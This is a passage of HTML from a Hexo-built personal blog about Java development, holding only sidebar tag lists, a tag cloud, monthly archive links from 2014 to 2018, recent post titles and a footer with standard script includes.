href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Maven/">Maven</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySql/">MySql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mybatis/">Mybatis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nginx/">Nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/NoSQL/">NoSQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RPC/">RPC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Redis/">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Schedule/">Schedule</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Servlet/">Servlet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session/">Session</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shell/">Shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Solr/">Solr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Spring/">Spring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpringBoot/">SpringBoot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Springmvc/">Springmvc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Struts2/">Struts2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Swagger/">Swagger</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tomcat/">Tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Utilities/">Utilities</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WINDOWS/">WINDOWS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WorkFlow/">WorkFlow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XML/">XML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Zookeeper/">Zookeeper</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javaWEB/">javaWEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/面试/">面试</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/AOP/" style="font-size: 10px;">AOP</a> <a href="/tags/GIT/" style="font-size: 10px;">GIT</a> <a href="/tags/Git/" style="font-size: 10px;">Git</a> <a href="/tags/JQuery/" style="font-size: 10px;">JQuery</a> <a href="/tags/JS/" style="font-size: 10px;">JS</a> <a href="/tags/JSP/" style="font-size: 10px;">JSP</a> <a href="/tags/JavaEE/" style="font-size: 17.5px;">JavaEE</a> <a href="/tags/JavaSE/" style="font-size: 20px;">JavaSE</a> <a href="/tags/Kotlin/" style="font-size: 10px;">Kotlin</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Maven/" style="font-size: 10px;">Maven</a> <a href="/tags/MySql/" style="font-size: 17.5px;">MySql</a> <a href="/tags/Mybatis/" style="font-size: 12.5px;">Mybatis</a> <a href="/tags/Nginx/" style="font-size: 12.5px;">Nginx</a> <a href="/tags/NoSQL/" style="font-size: 10px;">NoSQL</a> <a href="/tags/RPC/" style="font-size: 10px;">RPC</a> <a href="/tags/Redis/" style="font-size: 10px;">Redis</a> <a href="/tags/Schedule/" style="font-size: 10px;">Schedule</a> <a href="/tags/Servlet/" style="font-size: 10px;">Servlet</a> <a href="/tags/Session/" style="font-size: 10px;">Session</a> <a href="/tags/Shell/" style="font-size: 10px;">Shell</a> <a href="/tags/Solr/" style="font-size: 10px;">Solr</a> <a href="/tags/Spring/" style="font-size: 10px;">Spring</a> <a href="/tags/SpringBoot/" style="font-size: 10px;">SpringBoot</a> <a href="/tags/Springmvc/" style="font-size: 10px;">Springmvc</a> <a href="/tags/Struts2/" style="font-size: 15px;">Struts2</a> <a href="/tags/Swagger/" style="font-size: 10px;">Swagger</a> <a href="/tags/Tomcat/" style="font-size: 15px;">Tomcat</a> <a href="/tags/Utilities/" style="font-size: 10px;">Utilities</a> <a href="/tags/WEB/" style="font-size: 10px;">WEB</a> <a href="/tags/WINDOWS/" style="font-size: 10px;">WINDOWS</a> <a href="/tags/WorkFlow/" style="font-size: 10px;">WorkFlow</a> <a href="/tags/XML/" style="font-size: 10px;">XML</a> <a href="/tags/Zookeeper/" style="font-size: 10px;">Zookeeper</a> <a href="/tags/javaWEB/" style="font-size: 10px;">javaWEB</a> <a href="/tags/面试/" style="font-size: 10px;">面试</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">November 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2018/03/03/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2018/02/01/Java面试知识点总结/">Java面试知识点总结</a>
          </li>
        
          <li>
            <a href="/2018/01/31/SpringBoot入门/">SpringBoot入门</a>
          </li>
        
          <li>
            <a href="/2018/01/31/支付宝支付功能/">支付宝支付功能</a>
          </li>
        
          <li>
            <a href="/2018/01/31/List集合切割的工具类/">List集合切割的工具类</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2018 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>